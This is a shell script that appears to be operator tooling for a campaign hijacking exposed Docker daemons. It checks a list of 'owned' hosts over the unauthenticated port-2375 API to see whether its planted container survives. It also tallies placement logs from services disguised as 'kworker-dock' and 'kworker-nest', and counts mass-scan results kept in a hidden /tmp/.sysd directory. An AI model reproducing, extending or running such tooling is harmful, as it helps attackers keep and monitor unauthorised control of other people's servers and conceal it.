#!/bin/sh
# throwaway: read-only. Is our container still on the hosts we "own", and what did
# the last hour of placement actually do? Writes /tmp/_census2.out.
S=/tmp/.sysd
n=0; up=0; have=0
for ip in $(cut -f1 $S/.hunt/dock.owned 2>/dev/null | sort -u); do
    n=$((n + 1))
    body=$(curl -s -m 3 "http://$ip:2375/containers/json?all=1" 2>/dev/null)
    [ -n "$body" ] && up=$((up + 1))
    if printf %s "$body" | grep -q kw; then
        have=$((have + 1)); echo "HAS $ip"
    fi
done
echo "owned=$n api_up=$up have_container=$have"
echo "-- dock last 60min"
D=$(journalctl -u kworker-dock --since -60min --no-pager 2>/dev/null)
echo "log_lines=$(printf %s "$D" | grep -c .)"
echo "start_ok=$(printf %s "$D" | grep -c 'start said: 0')"
echo "start_404=$(printf %s "$D" | grep -c 'page not found')"
echo "create_failed=$(printf %s "$D" | grep -c 'create failed')"
echo "api_probe_ok=$(printf %s "$D" | grep -c 'daemon ')"
echo "-- nest capacity history"
journalctl -u kworker-nest --since -3h --no-pager 2>/dev/null | grep -c capacity
journalctl -u kworker-nest --since -3h --no-pager 2>/dev/null | grep capacity | tail -4
echo "-- supply"
echo "owned=$(wc -l < $S/.hunt/dock.owned 2>/dev/null)"
echo "mass_found=$(wc -l < $S/.hunt/mass.found 2>/dev/null)"
echo "dock_seen=$(wc -l < $S/.hunt/dock.seen 2>/dev/null)"
echo "mass_done=$(wc -l < $S/.hunt/mass.done 2>/dev/null)"
echo "-- nestd stat"
curl -s -m 4 http://127.0.0.1:8080/stat 2>/dev/null; echo
echo "-- class ledger"
cut -f2 $S/.hunt/dock.cls 2>/dev/null | sort | uniq -c | sort -rn | head -10
echo "done=$(date -u)"
